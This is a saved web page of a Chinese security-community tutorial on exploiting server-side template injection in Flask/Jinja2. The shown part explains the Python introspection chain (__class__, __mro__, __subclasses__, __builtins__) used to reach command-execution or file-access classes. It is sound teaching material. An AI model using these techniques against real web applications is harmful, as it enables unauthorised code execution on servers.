<!DOCTYPE html>
<!-- saved from url=(0035)https://xz.aliyun.com/t/9584#toc-32 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
    <link href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/editormd.min.css">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/tango.css">
    <link href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
    <!-- Le styles -->
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/OverlayStyle.css">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/topic.css">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/beautify.css">
    
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/editormd.css">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/jquery.fancybox.min.css">

    <!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    
    

    <!--[if !IE]> -->
    <script type="text/javascript" src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
    
    
    <script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/jquery.fancybox.min.js.下载"></script>

    <!-- <![endif]-->
<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>
<body>
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center; position:relative;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9584&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1 text-right">
                    <form method="get" action="https://xz.aliyun.com/search">
                        <input type="text" placeholder="搜索" name="keyword">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    



    <script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/jquery.toc.min.js.下载"></script>
    <script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/toc.min.js.下载"></script>
    <script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/dt.js.下载"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xz.aliyun.com/u/31688">
                        <span class="username cell"> Marcus_Holloway</span></a> <span class="i-seprator"> / </span>
                    <span> 2021-05-25 17:39:37</span><span class="i-seprator"> / </span>
                    
                    <span>浏览数 17357</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xz.aliyun.com/tab/4">社区板块</a></span>
                        <span class="label label-default">
                            <a href="https://xz.aliyun.com/node/16">WEB安全</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(9584);">
             顶(5)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(9584);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <p><a id="img0" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174652-22549aba-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174652-22549aba-bd3e-1.png"></a></p>
<h1>Flask-jinja2 SSTI 一般利用姿势</h1>
<h2 id="toc-0">SSTI 中常用的魔术方法</h2>
<p>很多刚开始学习SSTI的新手可能看到上面的利用方法就蒙圈了，不太懂为什么要这么做，下面来讲一下关于Python中类的知识。<br>
面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是<strong>object</strong>，而object拥有众多的子类。</p>
<p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 <code>__class__</code> 是类的一个内置属性，表示类的类型，返回 <code>&lt;type 'type'&gt;</code> ； 也是类的实例的属性，表示实例对象的类。</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'str'</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'tuple'</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'list'</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'dict'</span><span class="o">&gt;</span>
</pre></div>
<p><code>__bases__</code>：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的<strong>元组</strong>（虽然只有一个元素）。注意是直接父类！！！</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span><span class="p">,)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'basestring'</span><span class="o">&gt;</span><span class="p">,)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span><span class="p">,)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span><span class="p">,)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>   <span class="o">//</span> <span class="n">python2下雨python3下不同</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span>

<span class="o">&gt;&gt;&gt;</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span>
</pre></div>
<p>获取基类还能用 <code>__mro__</code> 方法，<code>__mro__</code> 方法可以用来获取一个类的调用顺序，比如：</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>   <span class="o">//</span> <span class="n">python2下和python3下不同</span>
<span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">object</span><span class="s1">'&gt;)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">list</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">object</span><span class="s1">'&gt;)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">dict</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">object</span><span class="s1">'&gt;)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">tuple</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">object</span><span class="s1">'&gt;)</span>

<span class="o">&gt;&gt;&gt;</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>            <span class="o">//</span> <span class="err">返回的是一个类元组，使用索引就能获取基类了</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">object</span><span class="s1">'&gt;</span>
</pre></div>
<p>除此之外，我们还可以利用 <code>__base__</code> 方法获取直接基类：</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
<span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'basestring'</span><span class="o">&gt;</span>
</pre></div>
<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（<code>&lt;class'object'&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p>
<p><code>__subclasses__()</code>：查看当前类的子类组成的列表，即返回基类object的子类。</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
<span class="p">[</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'type'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakref'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakcallableproxy'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakproxy'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'int'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'basestring'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'bytearray'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'list'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NoneType'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NotImplementedType'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'traceback'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'super'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'xrange'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'dict'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'set'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'slice'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'staticmethod'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'complex'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'float'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'buffer'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'long'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'frozenset'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'property'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'memoryview'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'tuple'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'enumerate'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'reversed'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'code'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'frame'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'builtin_function_or_method'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'instancemethod'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'function'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'classobj'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'dictproxy'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'generator'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'getset_descriptor'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'wrapper_descriptor'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'instance'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'ellipsis'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'member_descriptor'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'file'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'PyCapsule'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'cell'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'callable-iterator'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'iterator'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'sys.long_info'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'sys.float_info'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'EncodingMap'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'fieldnameiterator'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'formatteriterator'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'sys.version_info'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'sys.flags'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'sys.getwindowsversion'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'exceptions.BaseException'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'module'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'imp.NullImporter'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'zipimport.zipimporter'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'nt.stat_result'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'nt.statvfs_result'</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">warnings</span><span class="o">.</span><span class="n">WarningMessage</span><span class="s1">'&gt;, &lt;class '</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_weakrefset</span><span class="o">.</span><span class="n">_IterationGuard</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_weakrefset</span><span class="o">.</span><span class="n">WeakSet</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Hashable</span><span class="s1">'&gt;, &lt;type '</span><span class="nb">classmethod</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Iterable</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Sized</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Container</span><span class="s1">'&gt;, &lt;class '</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Callable</span><span class="s1">'&gt;, &lt;type '</span><span class="n">dict_keys</span><span class="s1">'&gt;, &lt;type '</span><span class="n">dict_items</span><span class="s1">'&gt;, &lt;type '</span><span class="n">dict_values</span><span class="s1">'&gt;, &lt;class '</span><span class="n">site</span><span class="o">.</span><span class="n">_Printer</span><span class="s1">'&gt;, &lt;class '</span><span class="n">site</span><span class="o">.</span><span class="n">_Helper</span><span class="s1">'&gt;, &lt;type '</span><span class="n">_sre</span><span class="o">.</span><span class="n">SRE_Pattern</span><span class="s1">'&gt;, &lt;type '</span><span class="n">_sre</span><span class="o">.</span><span class="n">SRE_Match</span><span class="s1">'&gt;, &lt;type '</span><span class="n">_sre</span><span class="o">.</span><span class="n">SRE_Scanner</span><span class="s1">'&gt;, &lt;class '</span><span class="n">site</span><span class="o">.</span><span class="n">Quitter</span><span class="s1">'&gt;, &lt;class '</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalEncoder</span><span class="s1">'&gt;, &lt;class '</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalDecoder</span><span class="s1">'&gt;, &lt;type '</span><span class="n">operator</span><span class="o">.</span><span class="n">itemgetter</span><span class="s1">'&gt;, &lt;type '</span><span class="n">operator</span><span class="o">.</span><span class="n">attrgetter</span><span class="s1">'&gt;, &lt;type '</span><span class="n">operator</span><span class="o">.</span><span class="n">methodcaller</span><span class="s1">'&gt;, &lt;type '</span><span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="s1">'&gt;, &lt;type '</span><span class="n">MultibyteCodec</span><span class="s1">'&gt;, &lt;type '</span><span class="n">MultibyteIncrementalEncoder</span><span class="s1">'&gt;, &lt;type '</span><span class="n">MultibyteIncrementalDecoder</span><span class="s1">'&gt;, &lt;type '</span><span class="n">MultibyteStreamReader</span><span class="s1">'&gt;, &lt;type '</span><span class="n">MultibyteStreamWriter</span><span class="s1">'&gt;]</span>
</pre></div>
<p>查阅起来有些困难，来列举一下：</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span> <span class="k">print</span> <span class="n">i</span>
<span class="o">.....</span>
<span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'type'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakref'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakcallableproxy'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakproxy'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'int'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'basestring'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'bytearray'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'list'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NoneType'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NotImplementedType'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'traceback'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'super'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'xrange'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'dict'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'set'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'slice'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'staticmethod'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">17</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'complex'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'float'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="o">......</span>
<span class="p">(</span><span class="mi">38</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'ellipsis'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">39</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'member_descriptor'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'file'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">41</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'PyCapsule'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'cell'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">43</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'callable-iterator'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="o">......</span>
</pre></div>
<p><strong>注意：</strong>这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。</p>
<p>当然我们也可以直接用<code>object.__subclasses__()</code>，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p>
<p><code>__builtins__</code>：以一个集合的形式查看其引用</p>
<blockquote><h4>内建函数</h4>
<p>当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p>
<p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p>
<p><code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p>
</blockquote>
